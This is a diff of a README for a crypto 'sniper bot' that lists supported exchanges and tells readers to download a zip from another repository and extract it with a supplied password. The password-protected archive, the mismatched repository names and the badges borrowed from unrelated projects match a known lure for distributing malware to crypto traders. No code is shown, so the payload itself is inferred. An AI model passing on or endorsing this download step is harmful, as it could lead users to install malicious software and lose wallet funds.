@@ -1,10 +1,10 @@
-# Dex-sniper-bot
+# dex-sniper-bot
 
 <p align="center">
   <a href="https://www.npmjs.com/package/hashlips_art_engine">
     <img alt="downloads" src="https://img.shields.io/npm/dm/hashlips_art_engine.svg?color=blue" target="_blank" />
   </a>
-  <a href="https://github.com/kefranabg/readme-md-generator/blob/master/LICENSE">
+  <a href="https://github.com/deadspyexx/dex-sniper-bot/blob/main/LICENSE">
     <img alt="License: MIT" src="https://img.shields.io/badge/license-MIT-yellow.svg" target="_blank" />
   </a>
   <a href="https://codecov.io/gh/kefranabg/readme-md-generator">
@@ -23,18 +23,15 @@ To identify profitable trades, sniper bots use technical analysis and various in
 
 ![Mempool sniper bot interface](https://github.com/deadspyexx/Mempool-sniper-bot/blob/main/menu_screen.png?raw=true)
 
-* Pancakeswap (Binance Smart Chain (BSC))
-* PYEswap (Binance Smart Chain (BSC))
-* Uniswap (Ethereum (ETH))
-* Sushiswap (Polygon (MATIC))
-* Quickswap (Polygon (MATIC))
-* Trader Joe (Avalanche (AVAX))
-* Pangolin (Avalanche (AVAX))
-* Spookyswap (Fantom(FTM))
-* Mad Meerkat (Cronos(CRO))
-* Sushiswap (Harmony(ONE))
-* Foxswap (Harony(ONE))
-* Milkyswap (Milkomeda(MilkADA))
+* Arbswap (Arbitrum)
+* Uniswap (Optimism)
+* BaseSwap (Base)
+* zkSwap Finance (ZkSync)
+* Pancakeswap (Binance Smart Chain)
+* Uniswap (Ethereum)
+* Sushiswap (Polygon)
+* Quickswap (Polygon)
+* Trader Joe (Avalanche)
 
 ## Installing
 - [Download](https://github.com/deadspyexx/Mempool-sniper-bot/archive/refs/heads/main.zip) repository and extract files with password `whLn1sTWT`.
